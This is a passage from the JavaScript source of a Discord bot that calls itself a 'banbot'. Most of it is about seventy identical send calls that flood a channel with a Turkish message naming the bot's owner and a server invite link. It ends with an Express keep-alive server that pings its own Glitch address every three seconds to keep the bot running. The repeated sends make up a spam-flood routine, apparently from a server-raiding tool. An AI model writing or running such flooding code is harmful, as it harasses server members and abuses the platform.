    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
     msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
     msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
     msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " ping tamamlandı");  ///null
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


 ///null
